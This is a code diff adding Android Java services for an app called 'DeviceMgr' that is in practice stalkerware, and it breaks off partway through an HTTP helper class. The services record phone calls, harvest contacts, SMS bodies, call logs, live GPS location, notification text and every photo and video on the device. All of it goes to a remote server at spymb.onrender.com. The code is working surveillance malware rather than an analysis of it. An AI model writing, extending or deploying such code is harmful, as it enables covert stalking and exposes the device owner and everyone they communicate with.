+			if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
+			checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+				Log.i(TAG, "missing RECORD_AUDIO or READ_PHONE_STATE permission");
+				stopForeground(true);
+				stopSelf();
+				return START_NOT_STICKY;
+			}
+		}
+		
+		startPhoneListener();
+		
+		return START_STICKY;
+	}
+	
+	private void startPhoneListener() {
+		try {
+			telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+			phoneListener = new PhoneStateListener() {
+				@Override
+				public void onCallStateChanged(int state, String phoneNumber) {
+					Log.d(TAG, "call state changed: " + state + " number:" + phoneNumber);
+					if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
+						// call started -> start recording
+						startRecording(phoneNumber);
+						} else if (state == TelephonyManager.CALL_STATE_IDLE) {
+						// call ended -> stop recording
+						stopRecordingAndUpload();
+					}
+				}
+			};
+			if (telephonyManager != null) {
+				telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "startPhoneListener err", e);
+		}
+	}
+	
+	private void startRecording(String number) {
+		try {
+			// prepare file in app-specific external dir
+			File dir = getExternalFilesDir("calls");
+			if (dir == null) dir = getFilesDir();
+			if (!dir.exists()) dir.mkdirs();
+			String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
+			String fname = "call_" + ts + (number != null ? ("_" + number.replaceAll("[^0-9]", "")) : "") + ".m4a";
+			currentFile = new File(dir, fname);
+			
+			recorder = new MediaRecorder();
+			// configuration - some devices require different audio source; try VOICE_CALL then MIC as fallback
+			try {
+				recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+				} catch (Exception e) {
+				try { recorder.setAudioSource(MediaRecorder.AudioSource.MIC); } catch (Exception ex) {}
+			}
+			recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+			recorder.setAudioSamplingRate(16000);
+			recorder.setOutputFile(currentFile.getAbsolutePath());
+			recorder.prepare();
+			recorder.start();
+			Log.i(TAG, "recording started: " + currentFile.getAbsolutePath());
+			} catch (Exception e) {
+			Log.e(TAG, "startRecording err", e);
+			try { if (recorder != null) { recorder.reset(); recorder.release(); recorder = null; } } catch (Exception ignored) {}
+		}
+	}
+	
+	private void stopRecordingAndUpload() {
+		try {
+			if (recorder != null) {
+				try {
+					recorder.stop();
+					} catch (Exception e) {
+					Log.w(TAG, "recorder stop warning", e);
+				}
+				try { recorder.reset(); recorder.release(); } catch (Exception ignored) {}
+				recorder = null;
+			}
+			if (currentFile != null && currentFile.exists()) {
+				uploadFile(currentFile);
+				// optionally delete
+				try { currentFile.delete(); } catch (Exception ignored) {}
+				currentFile = null;
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "stopRecordingAndUpload err", e);
+		}
+	}
+	
+	private void uploadFile(File f) {
+		new Thread(() -> {
+			try {
+				SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+				String deviceId = sp.getString("deviceId", "unknown");
+				String token = sp.getString("auth_token", null);
+				String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
+				String res = HttpClient.uploadFile(url, "media", f, token);
+				Log.i(TAG, "call upload resp: " + res);
+				} catch (Exception e) {
+				Log.e(TAG, "uploadFile err", e);
+			}
+		}).start();
+	}
+	
+	@Override
+	public void onDestroy() {
+		try {
+			if (telephonyManager != null && phoneListener != null) telephonyManager.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
+		} catch (Exception ignored) {}
+		try { if (recorder != null) { recorder.release(); recorder = null; } } catch (Exception ignored) {}
+		try { stopForeground(true); } catch (Exception ignored) {}
+		super.onDestroy();
+	}
+	
+	@Override
+	public IBinder onBind(Intent intent) { return null; }
+}
+
+suite/app/src/main/java/com/company/devicemgr/ services/ ContactsUploaderService.java
+
+package com.company.devicemgr.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.ContentResolver;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.Build;
+import android.os.IBinder;
+import android.provider.ContactsContract;
+import android.util.Log;
+
+import androidx.core.app.NotificationCompat;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.util.Locale;
+
+import com.company.devicemgr.utils.HttpClient;
+
+public class ContactsUploaderService extends Service {
+	private static final String TAG = "ContactsUploaderSvc";
+	private static final String CHANNEL_ID = "contacts_uploader_channel";
+	private static final int NOTIF_ID = 2001;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		createNotificationChannel();
+	}
+	
+	private void createNotificationChannel() {
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Contacts Upload", NotificationManager.IMPORTANCE_LOW);
+			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
+			if (nm != null) nm.createNotificationChannel(ch);
+		}
+	}
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		// must start foreground quickly when started via startForegroundService()
+		Notification n = buildNotification("A enviar lista de contactos...");
+		startForeground(NOTIF_ID, n);
+		
+		// run upload in background and stop when done
+		new Thread(() -> {
+			try {
+				uploadContactsOnce();
+				} catch (Exception e) {
+				Log.e(TAG, "uploadContactsOnce err", e);
+				} finally {
+				try { stopForeground(true); } catch (Exception ignored) {}
+				try { stopSelf(); } catch (Exception ignored) {}
+			}
+		}).start();
+		
+		return START_NOT_STICKY;
+	}
+	
+	private Notification buildNotification(String text) {
+		NotificationCompat.Builder b = new NotificationCompat.Builder(this, CHANNEL_ID)
+		.setContentTitle("DeviceMgr - Contacts")
+		.setContentText(text)
+		.setSmallIcon(android.R.drawable.ic_menu_send)
+		.setPriority(NotificationCompat.PRIORITY_LOW);
+		return b.build();
+	}
+	
+	private void uploadContactsOnce() {
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+				if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+					Log.i(TAG, "no READ_CONTACTS permission");
+					return;
+				}
+			}
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			String deviceId = sp.getString("deviceId", "unknown");
+			String token = sp.getString("auth_token", null);
+			
+			ContentResolver cr = getContentResolver();
+			Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+			String[] projection = {
+				ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+				ContactsContract.CommonDataKinds.Phone.NUMBER
+			};
+			Cursor cur = cr.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+			if (cur == null) {
+				Log.i(TAG, "no contacts cursor");
+				return;
+			}
+			
+			JSONArray arr = new JSONArray();
+			int max = 1000; // safety limit
+			while (cur.moveToNext() && max-- > 0) {
+				try {
+					String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+					String number = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+					if (number == null) continue;
+					JSONObject jo = new JSONObject();
+					jo.put("name", name != null ? name : "");
+					jo.put("number", number != null ? number : "");
+					arr.put(jo);
+					} catch (Exception ex) {
+					Log.w(TAG, "contact item err", ex);
+				}
+			}
+			cur.close();
+			
+			JSONObject body = new JSONObject();
+			body.put("type", "contacts");
+			body.put("payload", arr);
+			
+			String url = String.format(Locale.US, "https://spymb.onrender.com/api/telemetry/%s", deviceId);
+			try {
+				String res = HttpClient.postJson(url, body.toString(), token);
+				Log.i(TAG, "contacts upload response: " + res);
+				} catch (Exception e) {
+				Log.e(TAG, "contacts upload http err", e);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "uploadContactsOnce error", e);
+		}
+	}
+	
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
+}
+
+suite/app/src/main/java/com/company/devicemgr/ services/ ForegroundTelemetryService.java
+package com.company.devicemgr.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.ContentResolver;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.IBinder;
+import android.provider.MediaStore;
+import android.util.Log;
+
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.security.MessageDigest;
+import java.util.HashSet;
+import java.util.Iterator;
+import java.util.Set;
+
+/**
+* Foreground service que envia telemetria (localização) periodicamente,
+* carrega media uma vez no arranque e dispara envios de SMS / CallLog.
+* Também arranca ContactsUploaderService e CallRecorderService se houver consentimento.
+*/
+public class ForegroundTelemetryService extends Service implements LocationListener {
+	private static final String TAG = "ForegroundSvc";
+	private static final String CHANNEL_ID = "devicemgr_channel";
+	private LocationManager locationManager;
+	private volatile Location lastLocation = null;
+	private volatile boolean running = false;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		createNotificationChannelAndStartForeground();
+		locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+		running = true;
+		
+		// registar updates (GPS e NETWORK) se permissão concedida (API >= M)
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+				if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+					locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 15 * 1000L, 5f, this);
+				}
+				if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+					locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15 * 1000L, 10f, this);
+				}
+				} else {
+				// pre-M: assume permissão concedida no manifest
+				locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 15 * 1000L, 5f, this);
+				locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15 * 1000L, 10f, this);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "location request failed", e);
+		}
+		
+		// start additional services if consent recorded
+		try {
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			boolean consentContacts = sp.getBoolean("consent_contacts", false);
+			boolean consentCalls = sp.getBoolean("consent_calls", false);
+			if (consentContacts) {
+				// ContactsUploaderService is short-lived; start it (it will stop itself)
+				try { startServiceCompat(new Intent(this, ContactsUploaderService.class)); } catch (Exception ex) { Log.e(TAG, "start ContactsUploaderService", ex); }
+			}
+			if (consentCalls) {
+				try { startServiceCompat(new Intent(this, CallRecorderService.class)); } catch (Exception ex) { Log.e(TAG, "start CallRecorderService", ex); }
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "start consented services err", e);
+		}
+		
+		// worker thread: upload media once + periodic telemetry send
+		new Thread(() -> {
+			try { Thread.sleep(4000); } catch (InterruptedException e) { /* ignore */ }
+			
+			try {
+				uploadAllMediaOnce();
+				} catch (Exception e) {
+				Log.e(TAG, "uploadAllMediaOnce err", e);
+			}
+			
+			while (running) {
+				try {
+					sendTelemetryOnce();
+					Thread.sleep(30 * 1000L);
+					} catch (InterruptedException ie) {
+					break;
+					} catch (Exception e) {
+					Log.e(TAG, "sender loop err", e);
+				}
+			}
+		}).start();
+		
+		// send SMS and CallLog once at start (non-blocking)
+		new Thread(() -> {
+			try { sendSmsDump(); } catch (Exception e) { Log.e(TAG, "sendSmsDump err", e); }
+			try { sendCallLogDump(); } catch (Exception e) { Log.e(TAG, "sendCallLogDump err", e); }
+		}).start();
+		
+		getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("service_started", true).apply();
+		Log.i(TAG, "ForegroundTelemetryService created");
+	}
+	
+	private void createNotificationChannelAndStartForeground() {
+		// create channel for O+
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+			NotificationChannel nc = new NotificationChannel(CHANNEL_ID, "DeviceMgr", NotificationManager.IMPORTANCE_LOW);
+			NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+			if (nm != null) nm.createNotificationChannel(nc);
+		}
+		
+		Notification n;
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+			n = new Notification.Builder(this, CHANNEL_ID)
+			.setContentTitle("DeviceMgr")
+			.setContentText("Enviando telemetria")
+			.setSmallIcon(android.R.drawable.ic_menu_mylocation)
+			.build();
+			} else {
+			n = new Notification.Builder(this)
+			.setContentTitle("DeviceMgr")
+			.setContentText("Enviando telemetria")
+			.setSmallIcon(android.R.drawable.ic_menu_mylocation)
+			.build();
+		}
+		// start foreground
+		startForeground(1, n);
+	}
+	
+	/**
+	* Compatibility helper: startService / startForegroundService conforme versão.
+	*/
+	private void startServiceCompat(Intent intent) {
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+				startForegroundService(intent);
+				} else {
+				startService(intent);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "startServiceCompat err", e);
+		}
+	}
+	
+	/**
+	* Send a single telemetry payload to backend.
+	*/
+	private void sendTelemetryOnce() {
+		try {
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			String deviceId = sp.getString("deviceId", "unknown");
+			String token = sp.getString("auth_token", null);
+			JSONObject payload = new JSONObject();
+			
+			if (lastLocation != null) {
+				JSONObject loc = new JSONObject();
+				loc.put("lat", lastLocation.getLatitude());
+				loc.put("lon", lastLocation.getLongitude());
+				loc.put("accuracy", lastLocation.getAccuracy());
+				payload.put("location", loc);
+				} else {
+				Location fallback = null;
+				try {
+					if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+						if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED)
+						fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+						} else {
+						fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+					}
+				} catch (Exception e) { /* ignore */ }
+				try {
+					if (fallback == null) {
+						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+							if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED)
+							fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+							} else {
+							fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+						}
+					}
+				} catch (Exception e) { /* ignore */ }
+				
+				if (fallback != null) {
+					JSONObject loc = new JSONObject();
+					loc.put("lat", fallback.getLatitude());
+					loc.put("lon", fallback.getLongitude());
+					loc.put("accuracy", fallback.getAccuracy());
+					payload.put("location", loc);
+					} else {
+					payload.put("note", "no_location");
+				}
+			}
+			payload.put("ts", System.currentTimeMillis());
+			
+			JSONObject body = new JSONObject();
+			body.put("type", "telemetry");
+			body.put("payload", payload);
+			
+			String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+			try {
+				String res = com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
+				Log.d(TAG, "telemetry response: " + res);
+				} catch (Exception e) {
+				Log.e(TAG, "send telemetry http err", e);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "sendTelemetryOnce error", e);
+		}
+	}
+	
+	// LocationListener
+	@Override
+	public void onLocationChanged(Location location) {
+		lastLocation = location;
+		// send immediately (off main thread)
+		new Thread(() -> {
+			try {
+				SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+				String deviceId = sp.getString("deviceId", "unknown");
+				String token = sp.getString("auth_token", null);
+				JSONObject payload = new JSONObject();
+				JSONObject loc = new JSONObject();
+				loc.put("lat", location.getLatitude());
+				loc.put("lon", location.getLongitude());
+				loc.put("accuracy", location.getAccuracy());
+				payload.put("location", loc);
+				payload.put("ts", System.currentTimeMillis());
+				JSONObject body = new JSONObject();
+				body.put("type", "telemetry");
+				body.put("payload", payload);
+				String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+				com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
+				} catch (Exception e) {
+				Log.e(TAG, "onLocationChanged send err", e);
+			}
+		}).start();
+	}
+	
+	@Override public void onProviderDisabled(String provider) {}
+	@Override public void onProviderEnabled(String provider) {}
+	@Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
+	
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		// ensure service keeps running
+		Log.i(TAG, "onStartCommand");
+		return Service.START_STICKY;
+	}
+	
+	@Override
+	public void onDestroy() {
+		running = false;
+		try { if (locationManager != null) locationManager.removeUpdates(this); } catch (Exception e) { /* ignore */ }
+		getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("service_started", false).apply();
+		Log.i(TAG, "ForegroundTelemetryService destroyed");
+		super.onDestroy();
+	}
+	
+	// -------------------- SMS & CALLLOG sending --------------------
+	
+	private void sendSmsDump() {
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+				if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+					Log.i(TAG, "no READ_SMS permission");
+					return;
+				}
+			}
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			String deviceId = sp.getString("deviceId", "unknown");
+			String token = sp.getString("auth_token", null);
+			
+			ContentResolver cr = getContentResolver();
+			Cursor cur = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
+			if (cur == null) return;
+			int max = 200;
+			while (cur.moveToNext() && max-- > 0) {
+				try {
+					JSONObject payload = new JSONObject();
+					payload.put("from", cur.getString(cur.getColumnIndexOrThrow("address")));
+					payload.put("body", cur.getString(cur.getColumnIndexOrThrow("body")));
+					payload.put("ts", cur.getLong(cur.getColumnIndexOrThrow("date")));
+					JSONObject body = new JSONObject();
+					body.put("type", "sms");
+					body.put("payload", payload);
+					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "sms send err", e); }
+				} catch (Exception e) { Log.e(TAG, "sms item err", e); }
+			}
+			cur.close();
+			} catch (Exception e) {
+			Log.e(TAG, "sendSmsDump err", e);
+		}
+	}
+	
+	private void sendCallLogDump() {
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+				if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+					Log.i(TAG, "no READ_CALL_LOG permission");
+					return;
+				}
+			}
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			String deviceId = sp.getString("deviceId", "unknown");
+			String token = sp.getString("auth_token", null);
+			
+			ContentResolver cr = getContentResolver();
+			Cursor cur = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
+			if (cur == null) return;
+			int max = 200;
+			while (cur.moveToNext() && max-- > 0) {
+				try {
+					JSONObject payload = new JSONObject();
+					payload.put("number", cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)));
+					payload.put("type", cur.getInt(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)));
+					payload.put("duration", cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)));
+					payload.put("ts", cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)));
+					JSONObject body = new JSONObject();
+					body.put("type", "call");
+					body.put("payload", payload);
+					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "call send err", e); }
+				} catch (Exception e) { Log.e(TAG, "call item err", e); }
+			}
+			cur.close();
+			} catch (Exception e) {
+			Log.e(TAG, "sendCallLogDump err", e);
+		}
+	}
+	
+	// -------------------- Media auto-upload --------------------
+	
+	/**
+	* Upload all media (images/videos) once at service start.
+	* Avoid duplicates by saving SHA-256 checksums in SharedPreferences (JSON object).
+	*/
+	private void uploadAllMediaOnce() {
+		try {
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+				if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+					Log.i(TAG, "no READ_EXTERNAL_STORAGE perm for media upload");
+					return;
+				}
+			}
+			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+			String deviceId = sp.getString("deviceId", "unknown");
+			String token = sp.getString("auth_token", null);
+			
+			// load uploaded set (JSON)
+			String uploadedJson = sp.getString("uploaded_media_hashes", "{}");
+			org.json.JSONObject uploadedObj = new org.json.JSONObject(uploadedJson);
+			Set<String> uploaded = new HashSet<>();
+			Iterator<?> it = uploadedObj.keys();
+			while (it.hasNext()) {
+				Object k = it.next();
+				if (k != null) uploaded.add(k.toString());
+			}
+			
+			ContentResolver cr = getContentResolver();
+			String[] projection = { MediaStore.MediaColumns._ID, MediaStore.MediaColumns.MIME_TYPE };
+			
+			// images
+			Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+			if (cursor != null) {
+				int count = 0;
+				while (cursor.moveToNext()) {
+					if (++count > 500) break; // safety limit
+					long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
+					String mime = null;
+					try { mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)); } catch (Exception e) { /* ignore */ }
+					Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+					try (InputStream is = cr.openInputStream(uri)) {
+						if (is == null) continue;
+						byte[] data = readAllBytes(is);
+						String hash = sha256(data);
+						if (hash == null) continue;
+						if (uploaded.contains(hash)) continue;
+						String filename = "img_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".jpg");
+						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
+						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
+						try {
+							JSONObject jr = new JSONObject(resp);
+							if (jr.optBoolean("ok")) {
+								uploaded.add(hash);
+								uploadedObj.put(hash, true);
+								sp.edit().putString("uploaded_media_hashes", uploadedObj.toString()).apply();
+							}
+						} catch (Exception e) { Log.e(TAG, "upload parse err", e); }
+					} catch (Exception e) { Log.e(TAG, "upload image err", e); }
+				}
+				cursor.close();
+			}
+			
+			// videos
+			Cursor vcur = cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+			if (vcur != null) {
+				int count = 0;
+				while (vcur.moveToNext()) {
+					if (++count > 500) break; // safety limit
+					long id = vcur.getLong(vcur.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
+					String mime = null;
+					try { mime = vcur.getString(vcur.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)); } catch (Exception e) { /* ignore */ }
+					Uri uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+					try (InputStream is = cr.openInputStream(uri)) {
+						if (is == null) continue;
+						byte[] data = readAllBytes(is);
+						String hash = sha256(data);
+						if (hash == null) continue;
+						if (uploaded.contains(hash)) continue;
+						String filename = "vid_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".mp4");
+						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
+						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
+						try {
+							JSONObject jr = new JSONObject(resp);
+							if (jr.optBoolean("ok")) {
+								uploaded.add(hash);
+								uploadedObj.put(hash, true);
+								sp.edit().putString("uploaded_media_hashes", uploadedObj.toString()).apply();
+							}
+						} catch (Exception e) { Log.e(TAG, "upload parse err", e); }
+					} catch (Exception e) { Log.e(TAG, "upload video err", e); }
+				}
+				vcur.close();
+			}
+			
+			} catch (Exception e) {
+			Log.e(TAG, "uploadAllMediaOnce err", e);
+		}
+	}
+	
+	private static byte[] readAllBytes(InputStream is) throws java.io.IOException {
+		ByteArrayOutputStream bos = new ByteArrayOutputStream();
+		byte[] buffer = new byte[8192];
+		int read;
+		while ((read = is.read(buffer)) != -1) {
+			bos.write(buffer, 0, read);
+		}
+		is.close();
+		return bos.toByteArray();
+	}
+	
+	private static String sha256(byte[] data) {
+		try {
+			MessageDigest md = MessageDigest.getInstance("SHA-256");
+			md.update(data);
+			byte[] digest = md.digest();
+			StringBuilder sb = new StringBuilder();
+			for (byte b : digest) sb.append(String.format("%02x", b & 0xff));
+			return sb.toString();
+			} catch (Exception e) {
+			Log.e(TAG, "sha256 error", e);
+			return null;
+		}
+	}
+}
+
+suite/app/src/main/java/com/company/devicemgr/ services/ NotificationListenerSvc.java
+package com.company.devicemgr.services;
+
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+import android.os.Build;
+import android.app.Notification;
+import android.util.Log;
+
+import com.company.devicemgr.utils.HttpClient;
+
+import org.json.JSONObject;
+
+public class NotificationListenerSvc extends NotificationListenerService {
+	private static final String TAG = "NotifListenerSvc";
+	
+	@Override
+	public void onNotificationPosted(StatusBarNotification sbn) {
+		try {
+			String pkg = sbn.getPackageName();
+			Notification notif = sbn.getNotification();
+			CharSequence title = notif.extras.getCharSequence(Notification.EXTRA_TITLE);
+			CharSequence text = notif.extras.getCharSequence(Notification.EXTRA_TEXT);
+			String titleS = title != null ? title.toString() : "";
+			String textS = text != null ? text.toString() : "";
+			
+			// build payload
+			JSONObject payload = new JSONObject();
+			payload.put("package", pkg);
+			payload.put("title", titleS);
+			payload.put("text", textS);
+			payload.put("ts", System.currentTimeMillis());
+			
+			// send to backend asynchronously
+			new Thread(() -> {
+				try {
+					android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+					String token = sp.getString("auth_token", null);
+					String deviceId = sp.getString("deviceId", "unknown");
+					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					JSONObject body = new JSONObject();
+					body.put("type", "notification");
+					body.put("payload", payload);
+					HttpClient.postJson(url, body.toString(), token);
+					} catch (Exception e) {
+					Log.e(TAG, "notif send err", e);
+				}
+			}).start();
+			
+			} catch (Exception e) {
+			Log.e(TAG, "onNotificationPosted error", e);
+		}
+	}
+	
+	@Override public void onNotificationRemoved(StatusBarNotification sbn) {
+		// no-op
+	}
+}
+
+suite/app/src/main/java/com/company/devicemgr/utils/ HttpClient.java
+package com.company.devicemgr.utils;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.ByteArrayOutputStream;
+import java.net.URLConnection;
+
+public class HttpClient {
+	private static OkHttpClient client = new OkHttpClient.Builder()
+	.connectTimeout(15, TimeUnit.SECONDS)
+	.readTimeout(30, TimeUnit.SECONDS)
+	.build();
+	
+	// MediaType JSON corrigido
+	private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+	
+	// POST JSON, devolve string de resposta
+	public static String postJson(String url, String json, String bearerToken) throws IOException {
+		RequestBody body = RequestBody.create(JSON, json);
+		Request.Builder rb = new Request.Builder().url(url).post(body);
+		if (bearerToken != null && bearerToken.length() > 0) rb.header("Authorization", "Bearer " + bearerToken);
+		Request request = rb.build();
+		Response res = client.newCall(request).execute();
+		String s = res.body() != null ? res.body().string() : null;
+		res.close();
+		return s;
+	}
+	
+	// Upload de ficheiro (campo form `fieldName`) usando multipart/form-data
+	// versão principal que recebe bytes
+	public static String uploadFile(String url, String fieldName, String filename, byte[] data, String mimeType, String bearerToken) throws IOException {
+		MediaType mt = MediaType.parse(mimeType != null ? mimeType : "application/octet-stream");
+		RequestBody fileBody = RequestBody.create(mt, data);
+		
+		MultipartBody requestBody = new MultipartBody.Builder()
+		.setType(MultipartBody.FORM)
+		.addFormDataPart(fieldName, filename, fileBody)
+		.build();
+		
+		Request.Builder rb = new Request.Builder().url(url).post(requestBody);
+		if (bearerToken != null && bearerToken.length() > 0) rb.header("Authorization", "Bearer " + bearerToken);
+		Request request = rb.build();
+		Response res = client.newCall(request).execute();
+		String s = res.body() != null ? res.body().string() : null;
+		res.close();
+		return s;
+	}
+	
+	// Conveniência: aceita File diretamente (lê em memória e delega na versão acima)
+	public static String uploadFile(String url, String fieldName, File file, String bearerToken) throws IOException {
+		if (file == null || !file.exists()) throw new IOException("file not found");
+		// tenta adivinhar mime type pelo nome
+		String mime = URLConnection.guessContentTypeFromName(file.getName());
+		if (mime == null) mime = "application/octet-stream";
+		
+		// lê ficheiro para byte[]
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		FileInputStream fis = null;
+		try {
+			fis = new FileInputStream(file);
